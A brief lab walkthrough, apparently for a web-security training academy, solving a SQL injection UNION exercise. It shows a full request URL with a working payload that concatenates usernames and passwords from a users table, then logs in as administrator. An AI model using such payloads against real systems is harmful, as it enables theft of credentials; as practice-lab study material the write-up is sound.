# SQL injection UNION attack, retrieving multiple values in a single column

1. Find the number of columns and determine that the second column supports text
2. Send the following request to get the usernames and passwords

```
https://0aa2009704f9411480df8078004d0093.web-security-academy.net/filter?category=Pets'+UNION+SELECT+null,username||'-'||password+FROM+users--+-
```

![[attachments/sqli-lab-10/file-20260204112703044.png]]

3. Sign in as the administrator to solve the lab

